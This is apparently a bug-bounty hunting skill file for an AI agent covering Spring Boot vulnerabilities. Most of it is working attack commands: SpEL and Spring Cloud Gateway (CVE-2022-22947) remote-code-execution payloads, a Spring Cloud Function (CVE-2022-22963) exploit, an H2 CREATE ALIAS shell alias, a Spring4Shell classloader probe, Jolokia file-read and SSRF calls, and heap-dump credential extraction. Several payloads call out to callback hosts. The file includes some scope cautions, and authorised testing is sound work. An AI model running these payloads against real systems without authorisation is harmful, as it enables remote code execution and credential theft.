---
name: hunt-springboot
description: Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SpEL (CVE-2022-22963), Spring Cloud Gateway actuator SpEL (CVE-2022-22947), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.
sources: hackerone_public, cve_database, spring_security_advisories
report_count: 16
---

# HUNT-SPRINGBOOT — Spring Boot Specific Vulnerabilities

## Crown Jewel Targets

Spring Boot Actuator `/actuator/heapdump` exposed = heap dump with all secrets in memory.

**Highest-value findings:**
- **`/actuator/heapdump`** — full JVM heap dump contains plaintext passwords, tokens, DB credentials, private keys stored anywhere in memory
- **`/actuator/env`** — lists all environment variables and Spring properties including secrets
- **`/actuator/shutdown`** — if the actuator index lists it, record that. **Never POST it** (that kills the process; DoS is out of scope)
- **H2 Console (`/h2-console`)** — in-memory DB admin UI → SQL query execution → potential RCE via `CREATE ALIAS` trick
- **SpEL injection** — Spring Expression Language in template fields, `@Value` annotations, SpEL-processed request params → RCE
- **Spring4Shell CVE-2022-22965** — Spring Framework < 5.3.18 + Tomcat → RCE via data binding
- **Spring Cloud Gateway Actuator SpEL (CVE-2022-22947)** — if `/actuator/gateway/routes` is writable, POST a route with a SpEL filter → RCE

**Decision tree (adapts to any Spring Boot target):**
1. `/actuator` (or `/manage`, `/management`, custom base) returns actuator JSON? → Phase 2 enumerate. The management port may differ from the app port (commonly `:8081`, `:9001`) — scan it.
2. `heapdump` exposed → Phase 3 (crown jewel: all in-memory secrets). `env`/`configprops` → secret read. `gateway/routes` POST-able → CVE-2022-22947 RCE. `jolokia` → Phase 7.
3. Actuator locked down? Spring4Shell (data-binding), SpEL in app inputs (Phase 5), and H2 console (Phase 4) are independent of actuator — keep going.
4. Any field that reflects `${...}`/`#{...}` → Phase 5 SpEL.
Run every positive branch; a hardened actuator does not end the hunt.

---

## Phase 1 — Fingerprint Spring Boot

```bash
# Spring Boot indicators
curl -sI https://$TARGET/ | grep -i "x-application-context\|x-content-type"
curl -s "https://$TARGET/nonexistent" | grep -i "Whitelabel Error Page\|Spring Boot\|org.springframework"

# Actuator root (may list available endpoints)
curl -s "https://$TARGET/actuator" | python3 -m json.tool 2>/dev/null
curl -s "https://$TARGET/actuator/" | python3 -m json.tool 2>/dev/null

# Try common base paths
for base in "" "/manage" "/management" "/app"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://$TARGET$base/actuator")
  [ "$STATUS" = "200" ] && echo "[+] Actuator at: $TARGET$base/actuator"
done
```

---

## Phase 2 — Actuator Endpoint Enumeration

```bash
# High-impact endpoints. GET only — never POST shutdown, refresh, or restart.
# Boot 1.x serves these at the root (/env, /heapdump), Boot 2/3 under /actuator.
ENDPOINTS=("env" "heapdump" "threaddump" "mappings" "beans" "metrics" 
           "loggers" "info" "health" "configprops" "trace"
           "httptrace" "auditevents" "sessions" "scheduledtasks" "caches"
           "flyway" "liquibase" "gateway/routes" "jolokia")

for BASE in "https://$TARGET/actuator" "https://$TARGET"; do
  for EP in "${ENDPOINTS[@]}"; do
    if [ "$EP" = "heapdump" ]; then
      # hprof magic. Do not slurp the dump in the enum loop (it is hundreds of MB).
      MAGIC=$(curl -s -r 0-20 "$BASE/$EP")
      printf '%s' "$MAGIC" | grep -q "JAVA PROFILE" && echo "[+] HEAPDUMP: $BASE/$EP"
      continue
    fi
    # Don't trust HTTP 200 alone — Spring returns 200 with a Whitelabel/login page.
    BODY=$(curl -s -H "Accept: application/json" "$BASE/$EP" | head -c 500)
    printf '%s' "$BODY" | grep -qi "Whitelabel Error Page\|<html" && continue
    # Spring-shaped JSON only. A generic /health {"status":"UP"} is not an actuator hit.
    printf '%s' "$BODY" | grep -Eq 'propertySources|"beans"|dispatcherServlets|requestMapping|"contexts"|jolokia|"agent"|predicates' \
      && echo "[+] EXPOSED: $BASE/$EP"
  done
done
BASE="https://$TARGET/actuator"   # loop leaves BASE on the root; later calls are Boot 2/3

# Get environment variables (passwords, API keys)
curl -s "$BASE/env" | python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key\|token\|credential" | head -20

# Get all endpoint mappings (full API surface)
curl -s "$BASE/mappings" | python3 -m json.tool 2>/dev/null | grep -oP '"pattern":"\K[^"]+' | sort

# Get Spring beans (lists all registered beans, reveals internal architecture)
curl -s "$BASE/beans" | python3 -m json.tool 2>/dev/null | head -100
```

### Actuator-driven RCE paths (when write endpoints are exposed)

```bash
# A) Spring Cloud Gateway SpEL (CVE-2022-22947) — 3.1.0, 3.0.0–3.0.6 (fixed
#    3.1.1 / 3.0.7), and older 2.x when the actuator routes API is exposed.
#    If POST /actuator/gateway/routes returns 201, run this even without a version
#    banner. SpEL runs on POST /actuator/gateway/refresh and the
#    command output is stored in the route. Read THAT JSON. StreamUtils is on
#    the Spring classpath (Java 8+); InputStream.readAllBytes() is not.
#    "order" is required on some 3.0.x builds or route build NPEs.
curl -s -X POST "$BASE/gateway/routes/huntroute" -H "Content-Type: application/json" -d '{
  "id":"huntroute","filters":[{"name":"AddResponseHeader","args":{
    "name":"X-Hunt","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}],
  "uri":"http://example.com","order":0,"predicates":[{"name":"Path","args":{"_genkey_0":"/hunt/**"}}]}'
curl -s -X POST "$BASE/gateway/refresh"
curl -s "$BASE/gateway/routes/huntroute" | grep -a "uid="
curl -s -X DELETE "$BASE/gateway/routes/huntroute"; curl -s -X POST "$BASE/gateway/refresh"

# B) /actuator/env property injection → RCE (when env is WRITABLE via POST, older setups).
#    Point a reloadable datasource/log4j/eureka property at an attacker URL, then /refresh.
#    Confirm via OOB callback (unique subdomain) — never claim RCE on a 200 alone.
```

---

## Phase 3 — Heap Dump Analysis

```bash
# Download heap dump (can be large — 100MB+)
curl -s "$BASE/heapdump" -o /tmp/heapdump.hprof
ls -lh /tmp/heapdump.hprof

# Quick grep for secrets in heap dump (binary file — use strings).
# Quote one live secret in the report. Do not attach the hprof.
# /actuator/env values of ****** are masked, not a leak — the dump or
# /actuator/env/<exact.property.name> is where the raw value still shows.
strings /tmp/heapdump.hprof | grep -iE "(password|secret|apikey|api_key|token|bearer|private_key)" | \
  grep -v "^[a-z_]" | sort -u | head -50

# More targeted extraction
strings /tmp/heapdump.hprof | grep -oP "(?:password|passwd|pwd)\s*[=:]\s*\S+" | sort -u | head -20
strings /tmp/heapdump.hprof | grep -oP "AKIA[A-Z0-9]{16}" | sort -u        # AWS keys
strings /tmp/heapdump.hprof | grep -oP "sk_live_[A-Za-z0-9]+" | sort -u     # Stripe keys
strings /tmp/heapdump.hprof | grep -oP "Bearer [A-Za-z0-9._-]+" | sort -u   # Bearer tokens

# Use Eclipse Memory Analyzer (MAT) for deep analysis
# https://www.eclipse.org/mat/
```

---

## Phase 4 — H2 Console RCE

```bash
# H2 console detection
curl -s "https://$TARGET/h2-console" | grep -i "H2 Console\|H2 Database"
curl -s "https://$TARGET/h2" | grep -i "H2 Console"
curl -s "https://$TARGET/console" | grep -i "H2"

# Default credentials (one try): sa / empty password. Not a wordlist.
# JDBC URL: the one the login page or spring.datasource.url already shows.
# A mem DB you just created is not the application's database.

# RCE via CREATE ALIAS, one statement, Java 8-safe (no readAllBytes).
# H2 2.x often rejects Java aliases — the rejection is SQL access, not RCE.
# CREATE ALIAS EXEC AS $$ String exec(String cmd) throws Exception {
#   Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
#   java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
#   return s.hasNext() ? s.next() : "";
# } $$;
# CALL EXEC('id');
```

---

## Phase 5 — SpEL Injection

```bash
# Spring Expression Language injection in user-controlled fields
# Test: ${7*7} or #{7*7} → if the response reflects 49, SpEL is being evaluated

# Common injection points:
# - Email template fields: "Hello ${name}"
# - Custom annotation @Value("${user.input}")
# - Spring Security expressions
# - Spring WebFlow

# Basic SpEL test
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{7*7}"}'
# If returns 49 → SpEL detection. RCE is the callback / uid= below, not the 49.

# RCE payload — note: exec() returns a Process, not a String, so a bare
# exec("id") produces NO visible output. Confirm via an OOB curl callback
# (the spawned curl makes the network request even though nothing is reflected).
# Runtime.exec(String) is not a shell — use String[] (or sh -c). curl needs a scheme:
curl -s -X POST "https://$TARGET/api/user/name" \
  -H "Content-Type: application/json" \
  -d '{"name": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"sh\",\"-c\",\"curl http://UNIQUE.collab/$(id|base64)\"})}"}'

# CVE-2022-22963 — Spring Cloud Function 3.0.x, 3.1.0–3.1.6, 3.2.0–3.2.2
# (fixed 3.1.7 / 3.2.3) plus /functionRouter. Probe when that header is accepted.
curl -s -X POST "https://$TARGET/functionRouter" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"curl","http://UNIQUE.collab/"})' \
  -d "test"
```

---

## Phase 6 — Spring4Shell (CVE-2022-22965)

```bash
# Affects: Spring Framework < 5.3.18 and < 5.2.20 (and all older branches);
# fixed in 5.3.18 / 5.2.20. Requires JDK 9+ and WAR-on-Tomcat deployment.
# Requires: Java 9+, Tomcat as WAR deployment

# Detection: does the app accept class.* parameters?
curl -s "https://$TARGET/api/user" \
  -d "class.module.classLoader.URLs[0]=jar:http://COLLAB_HOST/test.jar!/"
# Check COLLAB for HTTP callback

# Proof is the classloader fetch, not a JSP left on disk.
# A Collaborator hit on the URL below means data binding reached the Tomcat classloader
# (CVE-2022-22965). Do not set AccessLogValve prefix/suffix to write a .jsp webshell.
# No callback = not proven, even if the parameter did not 400.
```

---

## Phase 7 — Jolokia JMX Exposure

```bash
# Jolokia provides HTTP access to JMX MBeans
curl -s "https://$TARGET/jolokia" | python3 -m json.tool 2>/dev/null | head -20
curl -s "https://$TARGET/actuator/jolokia" | python3 -m json.tool 2>/dev/null | head -20

# List all MBeans
curl -s "https://$TARGET/jolokia/list" | python3 -m json.tool 2>/dev/null | grep -i "type\|operation" | head -30

# Read system properties via Jolokia (may expose credentials)
curl -s "https://$TARGET/jolokia/read/java.lang:type=Runtime/SystemProperties" | \
  python3 -m json.tool 2>/dev/null | grep -i "password\|secret\|key"

# compilerDirectivesAdd is a file READ (contents often land in the error text), not RCE.
# One path you already know exists, e.g. /etc/hostname. Stop. Do not walk the disk.
# curl -s "$BASE/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc/hostname"

# reloadByURL is SSRF: one GET, proof is your HTTP callback. Escape slashes as !/.
# Logback insertFromJNDI remote class loading does not work on current JDKs
# (trustURLCodebase=false). A callback is not RCE. Do not stand up an RMI/LDAP shell.
# curl -s "$BASE/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/UNIQUE.collab!/x"
```

---

## Chain Table

| Spring Boot finding | Chain to | Impact |
|--------------------|----------|--------|
| `/actuator/heapdump` | Extract DB passwords, API keys, session tokens from memory | Critical credential exfil |
| `/actuator/gateway/routes` POST + refresh | SpEL filter (CVE-2022-22947) → OS command | Critical RCE |
| `/actuator/env` | Read all env vars including secrets | High |
| H2 console accessible | CREATE ALIAS → RCE | Critical |
| SpEL injection | `T(Runtime).exec()` → OS command | Critical RCE |
| Spring4Shell | Classloader URL fetch (callback). Do not write a JSP | Critical only after the callback or a command marker |
| Jolokia `reloadByURL` | HTTP callback = SSRF (`hunt-ssrf`). File bytes from `compilerDirectivesAdd` = file read. Not RCE on current JDKs | High when a secret or an internal body comes back |

---

## Validation

✅ Heap dump: `strings`/MAT extracts readable passwords/tokens from the .hprof file (quote the exact secret)
✅ Actuator/env: real secrets visible in JSON response (not just masked `******`)
✅ Gateway SpEL RCE: command output lands in the response header OR OOB callback on a unique subdomain
✅ SpEL: `#{7*7}`→49 reflected, then RCE confirmed by command output or OOB (unique subdomain) — not "no error"
✅ H2 console: `CALL EXEC('id')` output returned. Alias rejected = SQL console only
✅ Jolokia: a secret in the JSON, file bytes, or one callback. Not "list returned 200"

**Severity:**
- Heapdump with credentials: Critical
- SpEL RCE: Critical
- H2 console RCE: Critical
- Actuator env (passwords exposed): High
- Mappings disclosure only: Low-Medium

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
